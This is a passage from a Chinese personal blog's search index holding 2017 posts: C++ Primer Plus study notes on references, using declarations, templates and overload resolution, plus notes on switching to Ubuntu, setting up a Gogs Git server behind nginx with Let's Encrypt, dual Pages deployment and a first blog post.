foo(int a, int b); //修改后实现 int foo(const int \u0026a, const int \u0026b); 原理是这样的，根据作用原理，第一个函数实现必须要在内部创建临时变量存储a和b的值，这部分内存和时间开销根本没有必要，所以我们选择了第二种实现，直接把变量传进去，同时使用了const限定符，保证内部不会修改a和b，减少部分开销，实际上提升了效率。 3.using指令问题 using指令两种用法： //编译器预处理指令 using namespace std; //using声明 using std::cin; using std::cout; 二者存在这样的区别： 编译器预处理指令跟#define之类一样，直接导入整个命名空间，那么对于下列代码： using namespace std; //此时已经导入了cin ifstream cin(\"xxx.xxx\"); 那么cin会局部变量隐藏全局变量，只有我们定义的cin起了作用。 using声明则大有不同，看这个： using std::cin; //using声明也导入cin ifstream cin(\"xxx.xxx\"); //编译器报错！ 为什么报错呢？using声明实际上声明了cin，也就是引用了std这个命名空间里面的cin定义，然而这个时候我们想自己定义cin的时候就出现了单一定义冲突，编译器肯定报错。 从刚才的讨论其实导出一点，就是我们更多时候应该使用using声明或者直接上作用域解析运算符来使用命名空间的变量，而不是一股脑导入。不过做ACM题之类的还是无伤大雅的：） 4. 模板函数 模板是泛型的内容，像我这样喜欢重复造轮子的人十分喜欢这种概念。 这个部分主要讨论匹配问题： 首先考虑如下代码： template\u003ctypename T\u003e void swap(T \u0026a, T \u0026b){ T temp = b; b = a; a = temp; } 这个相信大家都能看懂，下面讨论的所有代码上方都有如上定义。 实例化 实例化就是把一个模板函数实例成为一个对应数据类型的函数的过程。这里有两种形式，隐式和显式。 看如下例子： int a,b; float c,d; //case 1 swap(a, b); //case 2 swap(c, d); //case 3 swap\u003cint\u003e(a, b); //case 4, but may not work. swap\u003cint\u003e(c, d); template void swap\u003cint\u003e(int, int); 很简单的，case 1和2都是隐式实例化，当编译器翻译到这一行的时候，就会知道根据传参类型自动生成一个int类型的max函数给case1，生成一个float类型的max函数给case2。而case3和case4都是显式的，这么指定就要求编译器对这两组数据都生成一个int类型的max函数，如大家所知道的，对于case4会出现截断问题，而对于case3就能完美工作。 最后一行那个代码也是显式实例化，但是我们很少这么用。我们用到显式实例化的地方一般是写了一个类，比如自写List的时候： template\u003ctypename T\u003e class List{ T *head; ... }; ... List\u003cint\u003e myList; 那这个时候我们使用类的时候，显式指定成员变量类型为int的一个链表myList，就能执行对int的基本操作。 具体化 具体化就是指定一种数据类型下模板函数该怎么做的过程。这个过程必须显式。 看如下例子： class Dorm{ std::string name; int roomNumer; int bedNumber; }; //declaration template \u003c\u003e void swap\u003cDorm\u003e(Dorm \u0026, Dorm \u0026); //defination template \u003c\u003e void swap\u003cDorm\u003e(Dorm \u0026stu1, Dorm \u0026stu2){ swap(stu1.roomNumber, stu2.roomNumber); swap(stu1.bedNumber, stu2.bedNumber); } 可以看到，显式具体化需要有函数声明和函数定义，因为具体化，我们必须具体指出函数行为，实际上就是同名函数的一个重载过程。 上面实现了一个简单的宿舍类，记录了学生姓名，房间号和床号。当我们交换两个学生床位的时候，我们不能直接使用已定义好的模板函数swap，因为这样会交换二者的名字。这样我们必须显式指出面对Dorm类成员的时候，swap函数应有的行为，这个时候我们就使用显示具体化。 那么为什么我们需要这样做呢？我们不是有重载吗？实际上，这里我也没有详细考证。根据函数匹配来看，使用重载函数的优先级显然高于一个显式具体化的模板函数；而从代码风格来看，给出重载函数也比显式具体模板函数看起来更清晰易懂。所以我个人推荐是对于特殊的情况使用函数重载而不要使用使用显式具体化后的模板函数。（如果有特例未来会更新）。 5.编译器函数匹配问题 这个问题是一个大坑，所以我尽可能简单说。 一般来说，编译器拿到你的代码，会遇到这样的代码： //泛型 template\u003ctypename T\u003e T func(T a, T b){ //some operation... } //重载 int func(const int \u0026a, const int \u0026b){ //also some operation... } int func(const int *a, const int *b){ //operations!!!! } 好了，编译器遇到这么多函数，当你调用的时候，它怎么选择合适的函数去匹配呢？ 首先要明确的一点是，假如有两个最适匹配，也就是两种匹配都能做到最简单，那么编译器就会报错。这个很好理解，这两种匹配下面的实现可能有不同，也可能相同，调用可能会带来很严重的副作用，编译器不能冒这个险，所以下面谈优先级都是建立在不会出现两个或以上函数出现同级最适匹配的情况。 那么我们简单来说，编译器遇到匹配的时候，是这样的步骤： 创建候选函数列表。 使用候选列表创建可行列表。 查找是否有最适匹配。 从内部来看，创建可行列表的时候编译器还会做隐式类型转换，比如说有一个double的模板，那么明显可以考虑作为float参数的可行函数，因为存在float到double的隐式转换。 我们重点讨论第三个，援引CPP289页的一个例子： //函数签名 void may(int); //#1 float may(float, float = 3); //#2 void may(char); //#3 char * may(const char *); //#4 char may(const char \u0026); //#5 template\u003cclass T\u003e void may(const T \u0026); //#6 template\u003ctypename T\u003e void may(T *); //#7 //函数调用 may('B'); 从上面来看，may函数被重载了7次，其中#6和#7还是参数模板重载。 首先看第一步，编译器会直接排除#4和#7，因为传参类型转换过程中不存在整数或者字符变量转换为指针变量的转换（注意，字符变量和字符串数组的区别），这两个就不存在，那么现在剩下5个。 第二步，生成可行列表之后要找最适匹配，一般来说，以下四条的优先级依次递减： 完全匹配，常规函数。 完全匹配，模板函数。 提升转换，如float到double，short转换为int。 标准转换，如char转换为int。 用户定义转换，比如类声明中定义的。 从这里来看，上述函数的优先级就能这么排序：#3和#5\u003e#6\u003e#1\u003e#2。 很明显，这里匹配重复了，编译器必定报错。 最适匹配存在着例外情况。下面只探讨两例： 无关紧要的类型转换 下面这个表描述了无关紧要的类型转换。 实参 形参 Type Type \u0026 Type \u0026 Type Type [] * Type Type (args) Type (*) (args) Type const Type Type volatile Type Type * const Type * Type * volatile Type * 那么也就是说，遇到这个表的时候，会进行这么转换，转换的同时不会影响具体性。 具体性 当编译器去匹配两个函数的时候，会看怎么样的匹配更具体。比如看这个例子： //两个模板调用 //模板签名 template\u003cclass Type\u003e void recycle(Type t); //","date":"2017-03-23","objectID":"/post/f0cd48b4/:1:1","tags":["技术","技术笔记","C++","C++ Primer Plus","读书笔记"],"title":"CPP学习笔记(1)","uri":"/post/f0cd48b4/"},{"categories":["个人记录"],"content":"换系统啦！ 主要是项目的原因，要在Linux下开发，然而虚拟机真的是卡出新高度，装上VSCode卡到地球毁灭！！！！ 然后我想了一下，直接装在硬盘上吧。 还好，F盘剩下了很大空间，删了点用不到的东西腾出170G，划了70G出来准备装Ubuntu。 其实之前还是想装Arch Linux，但是Arch官网很莫名我根本上不去，加上宿舍网垃圾，校内能下到的最快捷的只有Ubuntu了，那就直接装了。 装的过程其实没什么难度，用U盘烧上镜像启动格盘就行。感叹一下GRUB2的智能，已经可以自动识别并且读出Win10的引导了，很方便。 装好了之后我就准备搞一下，实际上用Linux开发是比Windows顺手的，我习惯于命令行编译了，而且shell也比Windows好用（ 首先肯定是换源。本来想换到阿里云的镜像，然而我看到Ubuntu中国就是在阿里云上托管的镜像，我就索性换了一下服务器就ok。 常用软件也就那么几个，VSCode、Sublime Text 3、网易云音乐、Chrome、Typora。 额外的我还装了一个Steam，哈哈。输入法选了Linux版搜狗，还是好用的。 有个问题是双击.deb包我装着很难受，然后我选择了sudo dkpg -i xxx.deb，舒爽！！！！ 令我比较惊讶的是，当我跑这个的时候： sudo apt-get install build-essential 居然已经装上了。 我觉得这就有点问题，Ubuntu号称是给用户用的桌面系统，不一定所有用户都会需要基础编译环境吧？我觉得很多用户可能就直接装deb包，根本不会手动make install，是有点臃肿。 其实开发习惯了还是Linux好用，目前配置了基础C/C++、Haskell、Java开发环境，加上搞了一下$L_AT_EX$，要学的东西越来越多了，哈哈。 惯例写点东西，其实我也快一周没开Windows了，Linux做开发顺手了真的不想换。 下一步还是搞Arch吧。 ","date":"2017-03-22","objectID":"/post/d4004311/:0:0","tags":["个人记录","系统","Linux","Ubuntu"],"title":"换Linux了","uri":"/post/d4004311/"},{"categories":["技术笔记"],"content":"一直想搭一个私有Git，加上刚刚加了个项目组，组内希望用私有Git做版本控制——这个任务就落到我头上来了。 本来想搭Gitlab的，然后我看了看Requirements: Minimal 4GB of RAM。 See you!!!!!!!! 在这个时候，我看到了Gogs，用Go语言写的轻量Git系统。很棒，因为就我们项目组在使用，短期内这个东西够用了，如果后期需要的话去租一个内存更大的VPS搭了Gitlab然后全部git push上去就完了。 其实也没搭过多少项目，这次也是折腾了一段时间，就写点东西记录一下吧。 主机是腾讯云的学生一元主机，跑的是Debian 8.2 64位。 ","date":"2017-03-05","objectID":"/post/dc28a2db/:0:0","tags":["Gogs","Git","Linux","技术"],"title":"Gogs搭建纪实","uri":"/post/dc28a2db/"},{"categories":["技术笔记"],"content":"搭建过程 安装依赖 sudo apt-get update sudo apt-get install git mysql-server mysql-client Gogs用MySQL做数据库，所以要装一下MySQL。在安装MySQL的时候会要求设置root密码，注意一下。 新建用户 不要把所有东西拿到root下面跑，不然很吓人的。 sudo adduser git su - git 我们新建一个git用户并且切换到这个用户，确保之后的所有操作都是在这个用户下。 下载Gogs 直接访问下载页面选择合适的下载方式下载并解压就行。 这边因为我直接用的二进制版本，就没有编译的事情了。如果想自己编译并安装，请看文档。 我是放在了git这个用户的home文件夹下面。 cd ~/gogs 配置MySQL 官方在包里面写好了一份表，我们直接导入就行。 mysql -u root -p \u003c scripts/mysql.sql 然后是配置一下MySQL mysql -u root -p \u003e CREATE USER 'gogs'@'localhost' IDENTIFIED BY '\u003cpassword\u003e'; \u003e GRANT ALL PRIVILEGES ON gogs.* TO 'gogs'@'localhost'; \u003e FLUSH PRIVILEGES; \u003e EXIT; 运行配置 现在差不多弄完了，直接执行./gogs web就能开起来了。访问 http://ip:3000/install 进行一下基本配置就能使用了。 ","date":"2017-03-05","objectID":"/post/dc28a2db/:1:0","tags":["Gogs","Git","Linux","技术"],"title":"Gogs搭建纪实","uri":"/post/dc28a2db/"},{"categories":["技术笔记"],"content":"额外设置 ","date":"2017-03-05","objectID":"/post/dc28a2db/:2:0","tags":["Gogs","Git","Linux","技术"],"title":"Gogs搭建纪实","uri":"/post/dc28a2db/"},{"categories":["技术笔记"],"content":"Nginx反向代理配置 服务是跑起来了，但是有个很奇妙的问题，当我用80端口来跑的时候Log报错Permission Denied，用root是没问题的，但是如果用root跑就和我的初衷违背了。以前有用过nginx，所以这次我也是用nginx做一个反代。 安装nginx 很简单，直接跑这个命令就行： sudo apt-get install nginx nginx配置 切换到/etc/nginx/sites-available/，新建任意一个文件，输入： server { server_name \u003cyour_domain\u003e; listen 80; location / { proxy_pass http://127.0.0.1:\u003clocalport\u003e/ } } 保存，然后来到/etc/nginx/sites-enabled，执行一下ln -s ../sites-available/\u003cconfig\u003e。 Gogs配置 cd /home/git/gogs/custom/conf Gogs的配置就存在这个目录下面的app.ini文件里面，改一下如下字段： HTTP_ADDR = 127.0.0.1 HTTP_PORT = \u003clocalport\u003e 这里要注意一下，上下两个文件的\u003clocalport\u003e部分要相同而且要本地没有占用的端口。建议设置完了后直接把这个端口封死在内网。可以用iptables，我是直接腾讯云安全组搞定了。 重启nginx 这个时候就ok了，直接重启一下nginx就能用了： udo service nginx restart ","date":"2017-03-05","objectID":"/post/dc28a2db/:2:1","tags":["Gogs","Git","Linux","技术"],"title":"Gogs搭建纪实","uri":"/post/dc28a2db/"},{"categories":["技术笔记"],"content":"全站SSL 既然都用了Nginx，为什么不直接搞一个全站SSL呢？ 服务用的Let’s Encrypt，之前也用过很多次了。怎么获取一个证书就不谈了，倒是获取的时候要记得使用stand-alone，方便取用。 修改nginx配置文件 回到刚才的nginx配置文件，改成这个样子： server { server_name \u003cyour_domain\u003e; listen 443; # SSL认证是通过443端口 ssl on; ssl_certificate /etc/letsencrypt/live/\u003cyour_domain\u003e/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/\u003cyour_domain\u003e/privkey.pem; location / { proxy_pass http://127.0.0.1:\u003clocalport\u003e; } } # 给80端口做301重定向 server { server_name \u003cyour_domain\u003e; listen 80; return 301 https://\u003cyour_domain\u003e$request_uri; } 修改Gogs配置文件 ROOT_URL = https://\u003cyour_domain\u003e 好了，重启一下nginx，就能看到大大的绿锁了~。 ","date":"2017-03-05","objectID":"/post/dc28a2db/:2:2","tags":["Gogs","Git","Linux","技术"],"title":"Gogs搭建纪实","uri":"/post/dc28a2db/"},{"categories":["技术笔记"],"content":"服务启动Gogs Gogs的默认逻辑还是本地程序，kill了当前的SSH seesion就没了，不过官方写好了脚本，就在scripts目录下面，各种各样的很全，我用的是systemd，直接改一下就行，注意是这一行： After=mysqld.server 其他的没啥可谈的，直接把gogs.service整个复制到/etc/systemd/system/目录下面，然后service gogs start就ok了。 以后就有私有git啦哈哈哈哈哈哈哈哈 （其实DDM的服务器被占了，还是比较难受的 ","date":"2017-03-05","objectID":"/post/dc28a2db/:2:3","tags":["Gogs","Git","Linux","技术"],"title":"Gogs搭建纪实","uri":"/post/dc28a2db/"},{"categories":["博客记录"],"content":"Github前段时间抽风过，并且在国内Github一直速度不是很理想，所以在国内又部署了一个Coding的Pages来分流，用了CloudXNS的DNS解析服务，可以CNAME分流解析，比较理想。 配置起来基本没什么难度，和Github差不多，先配置SSH，然后添加deploy就行。 关于多仓库同时deploy可以看这个issue 即： deploy: - \u003c第一个deployer\u003e - \u003c第二个deployer\u003e - ... ","date":"2017-02-25","objectID":"/post/0f4161a8/:0:0","tags":["记录"],"title":"分流部署记录","uri":"/post/0f4161a8/"},{"categories":["博客记录"],"content":"开始写博客了。 写点东西的想法有段时间了，过去一直是不断阅读，渐渐的也有了输出内容的想法。个人博客迟迟开不起来，一个原因就是懒，懒得折腾博客平台，Lofter之类的博客站又不是很喜欢；二一个则是能输出的东西也没有多少，总感觉开个博客怪矫情的。 但是写博客就是重在坚持，慢慢的就能知道应该写什么、适合写什么、怎么写之类问题的答案，能输出的内容也是不断学习、写作中积累。 折腾了半天，终于把这东西开起来了。 目前的托管情况： 博客托管在Github上，使用Github Pages来展示 使用的平台是Hexo 主题是NexT.Pisces 写作主要使用Typora 差不多就这样吧，程序员的第一篇总应该叫“Hello World”，国际惯例，哈哈。 See you soon! （P.S. DDM也将在近期复活，尽请期待~ ","date":"2017-02-21","objectID":"/post/c9e092e3/:0:0","tags":["记录"],"title":"Hello World","uri":"/post/c9e092e3/"}]